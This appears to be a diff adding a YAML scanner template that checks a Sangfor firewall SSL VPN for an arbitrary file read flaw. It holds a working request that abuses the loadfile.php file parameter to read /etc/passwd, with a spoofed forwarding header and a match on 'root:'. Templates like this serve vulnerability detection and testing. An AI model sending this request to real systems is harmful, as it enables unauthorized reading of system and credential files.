@@ -1,0 +1,14 @@
+name: 深信服-防火墙-loadfile-任意文件读取
+description: >-
+  读取passwd文件
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /svpn_html/loadfile.php?file=/etc/./passwd
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      y-forwarded-for: "127.0.0.1"
+    expression:
+      status: 200
+      body_all: ["root:"]
